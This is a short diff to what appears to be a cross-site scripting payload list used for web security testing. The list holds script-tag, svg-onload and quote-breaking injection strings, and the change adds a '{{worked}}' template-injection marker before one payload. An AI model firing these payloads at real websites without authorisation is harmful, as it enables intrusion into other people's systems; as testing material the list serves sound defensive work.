@@ -10,7 +10,7 @@ test<svg/onload=confirm(/testing/)>
 “><script>alert(“XSS”)</script>
 <script>alert(/XSS”)</script>
 <script>alert(/XSS/)</script>
-</script><script>alert(1)</script>
+{{worked}}      </script><script>alert(1)</script>
 ‘; alert(1);
 ‘)alert(1);//
 <ScRiPt>alert(1)</sCriPt>
